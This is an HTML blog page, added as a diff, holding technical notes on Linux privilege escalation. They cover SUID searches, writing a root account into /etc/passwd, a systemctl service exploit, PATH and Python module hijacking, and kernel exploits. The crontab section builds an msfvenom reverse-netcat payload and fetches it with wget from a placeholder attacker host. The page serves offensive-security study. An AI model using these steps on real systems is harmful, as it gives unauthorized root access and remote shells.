@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux Privilege Escalation | J Laratro</title>
+    <link rel="stylesheet" href="../../css/main.css">
+    <link rel="stylesheet" href="../../css/effects.css">
+    <link rel="stylesheet" href="../../css/pages.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        .blog-post-content { max-width: 900px; margin: 0 auto; }
+        .blog-post-header { margin-bottom: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border-color); }
+        .blog-post-title { font-family: var(--font-display); font-size: 2rem; color: var(--text-primary); margin-bottom: 1rem; }
+        .blog-post-meta { display: flex; gap: 2rem; flex-wrap: wrap; font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-muted); }
+        .blog-post-body { font-size: 1rem; line-height: 1.8; color: var(--text-secondary); }
+        .blog-post-body h2 { font-family: var(--font-display); font-size: 1.5rem; color: var(--accent-blue); margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border-color); }
+        .blog-post-body h3 { font-family: var(--font-display); font-size: 1.2rem; color: var(--text-primary); margin: 2rem 0 1rem; }
+        .blog-post-body h4 { font-family: var(--font-display); font-size: 1rem; color: var(--accent-green); margin: 1.5rem 0 0.75rem; }
+        .blog-post-body p { margin-bottom: 1rem; }
+        .blog-post-body pre { background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 1rem 0 1.5rem; font-family: var(--font-mono); font-size: 0.85rem; line-height: 1.5; }
+        .blog-post-body code { background: var(--bg-tertiary); padding: 0.2rem 0.4rem; border-radius: 3px; font-family: var(--font-mono); font-size: 0.9em; color: var(--accent-green); }
+        .blog-post-body pre code { background: transparent; padding: 0; }
+        .blog-post-body ul, .blog-post-body ol { margin: 1rem 0 1.5rem 1.5rem; }
+        .blog-post-body li { margin-bottom: 0.5rem; }
+        .blog-post-body a { color: var(--accent-blue); text-decoration: none; }
+        .blog-post-body a:hover { text-decoration: underline; }
+        .blog-tags { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 1rem; }
+        .blog-tag { font-family: var(--font-mono); font-size: 0.75rem; padding: 0.3rem 0.6rem; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: 4px; color: var(--accent-blue); }
+        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; font-family: var(--font-mono); font-size: 0.9rem; color: var(--text-muted); text-decoration: none; margin-bottom: 2rem; transition: var(--transition-normal); }
+        .back-link:hover { color: var(--accent-blue); }
+        .technique-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; }
+        .technique-card h3 { margin-top: 0; color: var(--accent-red); }
+        .resource-list { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; }
+        .resource-list h4 { color: var(--accent-blue); margin-top: 0; }
+        .resource-list ul { margin-bottom: 0; }
+    </style>
+</head>
+<body>
+    <!-- CRT Effect -->
+    <div class="crt"></div>
+
+    <!-- Grid Background -->
+    <div class="grid-bg"></div>
+
+    <!-- Classification Bar -->
+    <div class="class-bar"></div>
+
+    <!-- Tactical Frame -->
+    <div class="tactical-frame"></div>
+    <div class="tactical-frame-bottom"></div>
+
+    <!-- Navigation -->
+    <nav class="cyber-nav">
+        <div class="nav-container">
+            <div style="display: flex; align-items: center;">
+                <a href="../../index.html" class="nav-logo">
+                    <span class="logo-bracket">[</span>
+                    <span class="logo-text">JL</span>
+                    <span class="logo-bracket">]</span>
+                </a>
+                <span class="logo-tag">CYBER OPS</span>
+            </div>
+            <div class="nav-links">
+                <a href="../../index.html" class="nav-link">./home</a>
+                <a href="../about.html" class="nav-link">./whoami</a>
+                <a href="../cyber-projects.html" class="nav-link">./cyberops</a>
+                <a href="../projects.html" class="nav-link">./research</a>
+                <a href="../blog.html" class="nav-link active">./intel</a>
+                <a href="../contact.html" class="nav-link">./comms</a>
+            </div>
+            <button class="nav-toggle" aria-label="Toggle menu">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="page-content">
+        <div class="blog-post-content">
+            <a href="../blog.html" class="back-link">&larr; Back to Blog</a>
+
+            <article>
+                <header class="blog-post-header">
+                    <h1 class="blog-post-title">Linux Privilege Escalation - Overview</h1>
+                    <div class="blog-post-meta">
+                        <span>Type: Technical Notes</span>
+                        <span>Category: Privilege Escalation</span>
+                    </div>
+                    <div class="blog-tags">
+                        <span class="blog-tag">Linux</span>
+                        <span class="blog-tag">PrivEsc</span>
+                        <span class="blog-tag">SUID</span>
+                        <span class="blog-tag">Crontab</span>
+                        <span class="blog-tag">Kernel</span>
+                    </div>
+                </header>
+
+                <div class="blog-post-body">
+                    <p><strong>Horizontal privilege escalation</strong> - access pivot from users within the same permission scope</p>
+                    <p><strong>Vertical privilege escalation</strong> - access pivot from user with lower permissions to user with higher permissions</p>
+
+                    <p>Sometimes horizontal privilege escalation is necessary before executing vertical escalation. For example, if user1 (your foothold) has no misconfigurations or exploitable escalations to obtain root or another more highly privileged user, then it might be necessary to horizontally escalate to user2, who happens to have an exploitable binary with a SUID bit or a cronjob running with root permissions.</p>
+
+                    <p>Ie. low privilege 1 -> low privilege 2 -> high privilege</p>
+
+                    <div class="resource-list">
+                        <h4>Useful Tools/Resources</h4>
+                        <p><strong>Informational Resources:</strong></p>
+                        <ul>
+                            <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#tools" target="_blank">PayloadsAllTheThings - Privilege Escalation Overview</a></li>
+                            <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html" target="_blank">Total OSCP Guide</a></li>
+                            <li><a href="https://payatu.com/guide-linux-privilege-escalation" target="_blank">A guide to Linux Privilege Escalation</a></li>
+                        </ul>
+                        <p><strong>PrivEsc Automation, Scripts, and General Resources:</strong></p>
+                        <ul>
+                            <li><a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a> - Enumeration of linux systems for common privesc misconfigurations</li>
+                            <li>LinPEAS</li>
+                            <li>LinuxSmartEnumeration</li>
+                            <li>BeRoot</li>
+                            <li><a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> - Extremely useful collection of common Linux binaries and example privesc exploitation methods</li>
+                        </ul>
+                    </div>
+
+                    <h2>Commands Relevant to PrivEsc</h2>
+                    <pre><code>ls -lah
+
+find . -type f -perm /4000 or /2000 2>/dev/null
+
+sudo -l
+
+find . -writable 2>/dev/null
+
+vim --> :!sh</code></pre>
+
+                    <h2>SUID/SGID</h2>
+                    <pre><code>find . -user root -perm /x000</code></pre>
+                    <ul>
+                        <li><code>4000</code> is the permission flag for SUID</li>
+                        <li><code>2000</code> is the permission flag for SGID</li>
+                    </ul>
+
+                    <div class="technique-card">
+                        <h3>Writable /etc/passwd</h3>
+                        <p>Format of /etc/passwd:</p>
+                        <pre><code>user:password_hash:UID:GID:root:/root:/bin/bash</code></pre>
+                        <p>Since the passwords are not stored in plaintext, they first need to be hashed using openssl:</p>
+                        <pre><code>openssl passwd -1 -salt [thesalt] [thepassword]</code></pre>
+                        <p>The line to write into /etc/passwd, with user "new" and password "123":</p>
+                        <pre><code>new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</code></pre>
+                    </div>
+
+                    <div class="technique-card">
+                        <h3>Systemctl Exploitation</h3>
+                        <p>Systemctl is a part of the linux filesystem which interacts with systemd and is responsible for services. Systemctl is sometimes misconfigured, and can be exploited if it has SUID or SUDO privileges.</p>
+                        <h4>Find SUID systemctl:</h4>
+                        <pre><code>find . -user root -perm /4000</code></pre>
+                        <h4>Exploit (from GTFOBins):</h4>
+                        <pre><code>TF=$(mktemp).service
+
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF</code></pre>
+                        <p>This creates a temporary service file in /tmp directory. After writing the service configuration:</p>
+                        <pre><code>./systemctl link $TF
+./systemctl enable --now $TF</code></pre>
+                        <p>Example to read root flag:</p>
+                        <pre><code>ExecStart=/bin/sh -c "cp /root/root.txt /tmp/rootflag.txt"</code></pre>
+                    </div>
+
+                    <div class="technique-card">
+                        <h3>Crontab Exploitation</h3>
+                        <p>Cronjobs are automated tasks within a Linux system. If a cronjob is run with root privileges and we can write to it, we can leverage these permissions.</p>
+                        <h4>Check crontab:</h4>
+                        <pre><code>cat /etc/crontab</code></pre>
+                        <p>Format:</p>
+                        <pre><code>#  m   h dom mon dow user  command</code></pre>
+                        <h4>Create payload:</h4>
+                        <pre><code>msfvenom -p cmd/unix/reverse_netcat lhost=[ip] lport=[port] R > payload_name</code></pre>
+                        <h4>Host payload on local webserver:</h4>
+                        <pre><code>python3 -m http.server 80</code></pre>
+                        <h4>Download payload on target:</h4>
+                        <pre><code>cd /tmp
+wget http://[ip]/payload_name</code></pre>
+                        <h4>Write payload to cronjob:</h4>
+                        <pre><code>echo payload > /Documents/scanner.sh</code></pre>
+                    </div>
+
+                    <div class="technique-card">
+                        <h3>PATH Variable Exploitation</h3>
+                        <p>Privilege escalation via exploiting the path variable happens when an attacker can create an "evil twin" of the actual binary and redirect that binary to a malicious imitation.</p>
+                        <h4>Check PATH:</h4>
+                        <pre><code>echo $PATH</code></pre>
+                        <h4>Find writable directories:</h4>
+                        <pre><code>find / -writable -type d</code></pre>
+                        <h4>Create imitation binary:</h4>
+                        <pre><code>echo "/bin/bash" > ls
+chmod +x ls</code></pre>
+                        <h4>Export to path:</h4>
+                        <pre><code>export PATH=/tmp:$PATH</code></pre>
+                        <p>Now when the targeted script runs 'ls', it will execute our payload instead.</p>
+                    </div>
+
+                    <div class="technique-card">
+                        <h3>Python Module Hijacking</h3>
+                        <p>When python scripts are owned by a higher-privileged user and have import statements, these imports can be exploited by creating a directory and file with the same name used in the import statement.</p>
+                        <p>This works because python will check locally for modules before checking in other locations.</p>
+                    </div>
+
+                    <h2>Kernel Exploits</h2>
+                    <p>Kernel exploits are exploits in which native features or functions are abused with the purpose of escalating privileges.</p>
+                    <h4>Check kernel version:</h4>
+                    <pre><code>uname -a</code></pre>
+                    <p>Common kernel exploits include:</p>
+                    <ul>
+                        <li>PwnKit</li>
+                        <li>DirtyCow / DirtyCow2</li>
+                        <li>Sudo Baron / Sudo Baron 2</li>
+                        <li>American Sign Language</li>
+                        <li>Half Nelson / Half Nelson 2</li>
+                    </ul>
+
+                    <h4>Cross-compilation for 32-bit:</h4>
+                    <pre><code>gcc exploit.c -mtune=i686 -m32 -o exploit</code></pre>
+                    <h4>Example for dirtycow 64bit:</h4>
+                    <pre><code>gcc dirtycow2.c -pthread -Wall -lcrypt -o dc64</code></pre>
+
+                </div>
+            </article>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="cyber-footer">
+        <div class="footer-content">
+            <div class="footer-status">
+                <span class="footer-dot"></span>
+                <span>SYSTEMS ONLINE</span>
+            </div>
+            <div class="footer-links">
+                <a href="https://github.com/jeremylaratro" target="_blank" class="footer-link">[GitHub]</a>
+                <a href="https://www.linkedin.com/in/JeremyLaratro" target="_blank" class="footer-link">[LinkedIn]</a>
+            </div>
+            <div class="footer-copy">
+                &copy; <span id="year"></span> // Secure Channel
+            </div>
+        </div>
+    </footer>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
